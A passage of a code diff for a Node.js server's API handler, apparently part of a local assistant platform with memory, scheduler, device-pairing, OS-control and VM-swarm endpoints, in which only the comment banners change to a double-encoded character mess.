-    // â•â•â• POST /api/memory/semantic-search â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/memory/semantic-search Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/memory/semantic-search') {
       var body = JSON.parse(await readBody(req));
       var pm = refs.persistentMemory;
@@ -2520,14 +2580,14 @@ async function handleRequest(req, res) {
       return json(res, 200, { results: results, query: body.query });
     }
 
-    // â•â•â• GET /api/memory/index-status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/memory/index-status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/memory/index-status') {
       var pm2 = refs.persistentMemory;
       if (!pm2) return json(res, 500, { error: 'Persistent memory not available' });
       return json(res, 200, pm2.getIndexStatus());
     }
 
-    // â•â•â• POST /api/memory/rebuild-index â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/memory/rebuild-index Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/memory/rebuild-index') {
       var pm3 = refs.persistentMemory;
       if (!pm3) return json(res, 500, { error: 'Persistent memory not available' });
@@ -2535,21 +2595,21 @@ async function handleRequest(req, res) {
       return json(res, 200, indexResult);
     }
 
-    // â•â•â• GET /api/scheduler/calendar â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/scheduler/calendar Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/scheduler/calendar') {
       var sched = refs.scheduler;
       if (!sched) return json(res, 500, { error: 'Scheduler not available' });
       return json(res, 200, { events: sched.getCalendar(parsed.query.start, parsed.query.end) });
     }
 
-    // â•â•â• GET /api/scheduler/stats â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/scheduler/stats Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/scheduler/stats') {
       var sched2 = refs.scheduler;
       if (!sched2) return json(res, 500, { error: 'Scheduler not available' });
       return json(res, 200, sched2.getStats());
     }
 
-    // â•â•â• POST /api/scheduler/template â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/scheduler/template Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/scheduler/template') {
       var body = JSON.parse(await readBody(req));
       var sched3 = refs.scheduler;
@@ -2558,7 +2618,7 @@ async function handleRequest(req, res) {
       return json(res, 200, sched3.createFromTemplate(body.templateId));
     }
 
-    // â•â•â• POST /api/scheduler/run/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/scheduler/run/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath.startsWith('/api/scheduler/run/')) {
       var jobId = reqPath.split('/').pop();
       var sched4 = refs.scheduler;
@@ -2569,7 +2629,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/nodes/qr/:deviceId â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/nodes/qr/:deviceId Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath.startsWith('/api/nodes/qr/')) {
       var np = refs.nodePairing;
       if (!np) return json(res, 500, { error: 'Node pairing not available' });
@@ -2579,7 +2639,7 @@ async function handleRequest(req, res) {
       return json(res, 200, result);
     }
 
-    // â•â•â• POST /api/nodes/location â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/nodes/location Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/nodes/location') {
       var body = JSON.parse(await readBody(req));
       var np2 = refs.nodePairing;
@@ -2588,14 +2648,14 @@ async function handleRequest(req, res) {
       return json(res, 200, np2.reportLocation(body.deviceId, body.token, body.lat, body.lng, body.accuracy));
     }
 
-    // â•â•â• GET /api/nodes/locations â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/nodes/locations Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/nodes/locations') {
       var np3 = refs.nodePairing;
       if (!np3) return json(res, 500, { error: 'Node pairing not available' });
       return json(res, 200, { locations: np3.getAllLocations() });
     }
 
-    // â•â•â• POST /api/nodes/group â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/nodes/group Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/nodes/group') {
       var body = JSON.parse(await readBody(req));
       var np4 = refs.nodePairing;
@@ -2604,7 +2664,7 @@ async function handleRequest(req, res) {
       return json(res, 200, np4.createGroup(body.name, body.deviceIds || []));
     }
 
-    // â•â•â• POST /api/nodes/group/:id/command â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/nodes/group/:id/command Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath.match(/^\/api\/nodes\/group\/[^/]+\/command$/)) {
       var parts = reqPath.split('/');
       var groupId = parts[4];
@@ -2614,7 +2674,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { results: np5.sendGroupCommand(groupId, body.type, body.payload || {}) });
     }
 
-    // â•â•â• POST /api/telegram/webhook â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/telegram/webhook Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/telegram/webhook') {
       var body = JSON.parse(await readBody(req));
       var hub = refs.messagingHub;
@@ -2635,18 +2695,18 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 200, { ok: true }); }
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // SYSTEM INTEGRATION â€" Full OS Control
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // SYSTEM INTEGRATION Ã¢â‚¬" Full OS Control
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/system/stats â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/stats Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/stats') {
       var si = refs.systemIntegration;
       if (!si) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, si.getFullStats());
     }
 
-    // â•â•â• GET /api/system/processes â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/processes Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/processes') {
       var si2 = refs.systemIntegration;
       if (!si2) return json(res, 500, { error: 'System integration not available' });
@@ -2654,7 +2714,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { processes: si2.getRunningProcesses(topN) });
     }
 
-    // â•â•â• POST /api/system/launch â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/launch Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/launch') {
       var body = JSON.parse(await readBody(req));
       var si3 = refs.systemIntegration;
@@ -2663,7 +2723,7 @@ async function handleRequest(req, res) {
       return json(res, 200, si3.launchApp(body.name, body.args));
     }
 
-    // â•â•â• POST /api/system/close â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/close Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/close') {
       var body = JSON.parse(await readBody(req));
       var si4 = refs.systemIntegration;
@@ -2672,14 +2732,14 @@ async function handleRequest(req, res) {
       return json(res, 200, si4.closeApp(body.name));
     }
 
-    // â•â•â• GET /api/system/windows â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/windows Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/windows') {
       var si5 = refs.systemIntegration;
       if (!si5) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, { windows: si5.listWindows(), active: si5.getActiveWindow() });
     }
 
-    // â•â•â• POST /api/system/focus â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/focus Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/focus') {
       var body = JSON.parse(await readBody(req));
       var si6 = refs.systemIntegration;
@@ -2687,21 +2747,21 @@ async function handleRequest(req, res) {
       return json(res, 200, si6.focusWindow(body.title));
     }
 
-    // â•â•â• POST /api/system/screenshot â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/screenshot Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/screenshot') {
       var si7 = refs.systemIntegration;
       if (!si7) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, si7.takeScreenshot());
     }
 
-    // â•â•â• GET /api/system/clipboard â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/clipboard Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/clipboard') {
       var si8 = refs.systemIntegration;
       if (!si8) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, si8.getClipboard());
     }
 
-    // â•â•â• POST /api/system/clipboard â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/clipboard Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/clipboard') {
       var body = JSON.parse(await readBody(req));
       var si9 = refs.systemIntegration;
@@ -2709,7 +2769,7 @@ async function handleRequest(req, res) {
       return json(res, 200, si9.setClipboard(body.text || ''));
     }
 
-    // â•â•â• POST /api/system/notify â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/notify Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/notify') {
       var body = JSON.parse(await readBody(req));
       var si10 = refs.systemIntegration;
@@ -2717,7 +2777,7 @@ async function handleRequest(req, res) {
       return json(res, 200, si10.sendNotification(body.title, body.body, body.icon));
     }
 
-    // â•â•â• GET /api/system/files â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/files Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/files') {
       var si11 = refs.systemIntegration;
       if (!si11) return json(res, 500, { error: 'System integration not available' });
@@ -2725,7 +2785,7 @@ async function handleRequest(req, res) {
       return json(res, 200, si11.listFiles(dirPath));
     }
 
-    // â•â•â• POST /api/system/files/read â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/files/read Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/files/read') {
       var body = JSON.parse(await readBody(req));
       var si12 = refs.systemIntegration;
@@ -2734,7 +2794,7 @@ async function handleRequest(req, res) {
       return json(res, 200, si12.readFile(body.path, body.maxBytes));
     }
 
-    // â•â•â• POST /api/system/files/write â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/files/write Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/files/write') {
       var body = JSON.parse(await readBody(req));
       var si13 = refs.systemIntegration;
@@ -2743,7 +2803,7 @@ async function handleRequest(req, res) {
       return json(res, 200, si13.writeFile(body.path, body.content || ''));
     }
 
-    // â•â•â• POST /api/system/files/delete â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/files/delete Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/files/delete') {
       var body = JSON.parse(await readBody(req));
       var si14 = refs.systemIntegration;
@@ -2752,7 +2812,7 @@ async function handleRequest(req, res) {
       return json(res, 200, si14.deleteFile(body.path));
     }
 
-    // â•â•â• POST /api/system/files/search â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/files/search Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/files/search') {
       var body = JSON.parse(await readBody(req));
       var si15 = refs.systemIntegration;
@@ -2761,7 +2821,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { results: si15.searchFiles(body.query, body.path) });
     }
 
-    // â•â•â• POST /api/system/volume â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/volume Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/volume') {
       var body = JSON.parse(await readBody(req));
       var si16 = refs.systemIntegration;
@@ -2772,14 +2832,14 @@ async function handleRequest(req, res) {
       return json(res, 200, si16.getVolume());
     }
 
-    // â•â•â• GET /api/system/volume â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/volume Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/volume') {
       var si17 = refs.systemIntegration;
       if (!si17) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, si17.getVolume());
     }
 
-    // â•â•â• POST /api/system/power â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/power Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/power') {
       var body = JSON.parse(await readBody(req));
       var si18 = refs.systemIntegration;
@@ -2793,21 +2853,21 @@ async function handleRequest(req, res) {
       return json(res, 400, { error: 'Unknown action. Use: shutdown, restart, sleep, lock, cancel' });
     }
 
-    // â•â•â• GET /api/system/network â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/network Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/network') {
       var si19 = refs.systemIntegration;
       if (!si19) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, { ips: si19.getIPAddress(), wifi: si19.getWifiNetworks() });
     }
 
-    // â•â•â• GET /api/system/drives â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/drives Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/drives') {
       var si20 = refs.systemIntegration;
       if (!si20) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, { drives: si20.getDriveInfo() });
     }
 
-    // â•â•â• POST /api/system/ping â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/ping Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/ping') {
       var body = JSON.parse(await readBody(req));
       var si21 = refs.systemIntegration;
@@ -2816,35 +2876,35 @@ async function handleRequest(req, res) {
       return json(res, 200, si21.pingHost(body.host));
     }
 
-    // â•â•â• GET /api/system/ports â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/ports Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/ports') {
       var si22 = refs.systemIntegration;
       if (!si22) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, { ports: si22.getOpenPorts() });
     }
 
-    // â•â•â• GET /api/system/apps â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/apps Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/apps') {
       var si23 = refs.systemIntegration;
       if (!si23) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, { apps: si23.getInstalledApps() });
     }
 
-    // â•â•â• GET /api/system/startup â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/startup Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/startup') {
       var si24 = refs.systemIntegration;
       if (!si24) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, { apps: si24.getStartupApps() });
     }
 
-    // â•â•â• GET /api/system/services â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/services Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/services') {
       var si25 = refs.systemIntegration;
       if (!si25) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, { services: si25.listServices(parsed.query.filter) });
     }
 
-    // â•â•â• POST /api/system/service â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/service Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/service') {
       var body = JSON.parse(await readBody(req));
       var si26 = refs.systemIntegration;
@@ -2856,7 +2916,7 @@ async function handleRequest(req, res) {
       return json(res, 400, { error: 'Unknown action' });
     }
 
-    // â•â•â• POST /api/system/brightness â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/brightness Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/brightness') {
       var body = JSON.parse(await readBody(req));
       var si27 = refs.systemIntegration;
@@ -2864,53 +2924,53 @@ async function handleRequest(req, res) {
       return json(res, 200, si27.setBrightness(body.level));
     }
 
-    // â•â•â• GET /api/system/displays â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/displays Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/displays') {
       var si28 = refs.systemIntegration;
       if (!si28) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, { displays: si28.getDisplays() });
     }
 
-    // â•â•â• GET /api/system/recent-files â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/system/recent-files Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/system/recent-files') {
       var si29 = refs.systemIntegration;
       if (!si29) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, { files: si29.getRecentFiles() });
     }
 
-    // â•â•â• POST /api/system/dns/flush â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/dns/flush Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/dns/flush') {
       var si30 = refs.systemIntegration;
       if (!si30) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, si30.flushDNS());
     }
 
-    // â•â•â• POST /api/system/minimize-all â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/minimize-all Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/minimize-all') {
       var si31 = refs.systemIntegration;
       if (!si31) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, si31.minimizeAll());
     }
 
-    // â•â•â• POST /api/system/restore-all â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/system/restore-all Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/system/restore-all') {
       var si32 = refs.systemIntegration;
       if (!si32) return json(res, 500, { error: 'System integration not available' });
       return json(res, 200, si32.restoreAll());
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // SWARM VM MANAGEMENT
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/swarm/vms â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/swarm/vms Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/swarm/vms') {
       var sm = refs.swarmManager;
       if (!sm) return json(res, 500, { error: 'Swarm manager not available' });
       return json(res, 200, { vms: sm.listVMs(), capacity: sm.getCapacity() });
     }
 
-    // â•â•â• POST /api/swarm/vm â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/swarm/vm Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/swarm/vm') {
       var body = JSON.parse(await readBody(req));
       var sm2 = refs.swarmManager;
@@ -2919,7 +2979,7 @@ async function handleRequest(req, res) {
       return json(res, 200, result);
     }
 
-    // â•â•â• DELETE /api/swarm/vm/:id â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/swarm/vm/:id Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath.startsWith('/api/swarm/vm/') && !reqPath.includes('/deploy') && !reqPath.includes('/scale')) {
       var vmId = reqPath.split('/').pop();
       var sm3 = refs.swarmManager;
@@ -2927,7 +2987,7 @@ async function handleRequest(req, res) {
       return json(res, 200, sm3.removeVM(vmId));
     }
 
-    // â•â•â• POST /api/swarm/vm/:id/deploy â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/swarm/vm/:id/deploy Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath.match(/^\/api\/swarm\/vm\/[^/]+\/deploy$/)) {
       var deployId = reqPath.split('/')[4];
       var sm4 = refs.swarmManager;
@@ -2938,7 +2998,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/swarm/vm/:id/scale â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/swarm/vm/:id/scale Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath.match(/^\/api\/swarm\/vm\/[^/]+\/scale$/)) {
       var scaleId = reqPath.split('/')[4];
       var body = JSON.parse(await readBody(req));
@@ -2947,14 +3007,14 @@ async function handleRequest(req, res) {
